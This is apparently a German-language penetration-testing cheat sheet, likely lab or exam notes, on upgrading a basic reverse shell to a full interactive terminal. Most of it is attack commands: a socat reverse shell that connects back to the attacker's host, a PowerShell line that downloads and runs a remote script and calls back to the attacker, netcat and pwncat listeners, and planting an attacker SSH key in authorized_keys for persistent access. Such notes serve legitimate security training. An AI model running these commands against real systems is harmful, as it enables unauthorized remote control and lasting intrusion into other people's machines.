# 🆙 Shell Upgrade

> Dumme Shell (kein TAB, kein arrow-up, kein Ctrl+C ohne disconnect) → vollwertige PTY.

## 🐧 Linux — Klassische 4-Schritt-Methode

### Schritt 1: PTY spawnen

```bash
# Eine davon nimmt:
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null

# Wenn nichts davon:
perl -e 'exec "/bin/bash";'
```

### Schritt 2: Hintergrund-Trick (für Ctrl+C, etc.)

```
Ctrl+Z          # Shell pausieren
```

Auf Angreifer (lokale Shell):
```bash
stty raw -echo; fg
# Enter, Enter
```

### Schritt 3: Terminal-Settings exportieren

In der reverse Shell:
```bash
export TERM=xterm
export SHELL=/bin/bash

# Window-Size setzen (gegen "stty: standard input: Inappropriate ioctl")
stty rows 50 columns 200
# Werte siehst du auf eigener Maschine via: stty -a | head -1
```

### Schritt 4: Done!

Jetzt funktioniert: TAB, ↑/↓, Ctrl+C, less, vim, top, ssh.

> **Falle (aus dem Lab):** Ein vom Web-Prozess geerbtes `HOME=/root` führt zu irreführenden
> Permission-Fehlern. Vor `sudo` setzen: `export HOME=/home/<user>` und per
> `script -qc /bin/bash /dev/null` eine echte PTY ziehen.

---

## ⚡ One-Liner mit socat (besser als alles oben)

Wenn `socat` auf dem Target ist:

```bash
# Auf Angreifer:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Auf Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
```

→ Direkt vollwertige PTY, keine 4 Schritte.

## ⚡ pwncat-cs

```bash
# Statt nc:
pwncat-cs -lp 4444
# → upgraded automatisch zur full PTY
```

---

## 🪟 Windows

Windows reverse-shells sind meistens schon brauchbar (cmd.exe, PowerShell). Aber für TAB-Completion / proper Editing:

### ConPtyShell (best!)

```powershell
# Auf Target:
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $LHOST 4444 -Rows 50 -Cols 200

# Auf Angreifer (vorher):
stty raw -echo; (stty size; cat) | nc -lvnp 4444
```

### evil-winrm

→ Wenn Port 5985 offen: `evil-winrm` ist von Haus aus eine vollwertige Shell.

---

## 💡 SSH-Key-Trick (am stabilsten)

Wenn du irgendwo SCHREIBEN kannst auf dem Target:

```bash
# Auf Angreifer
ssh-keygen -t ed25519 -f exam_key -N ""
cat exam_key.pub

# Auf Target (in der Shell)
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAA... attacker" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Auf Angreifer
ssh -i exam_key user@$RHOST
# → echte SSH-Session, alle Komfort-Features
```

→ Funktioniert nur wenn SSHd läuft & User Login darf.
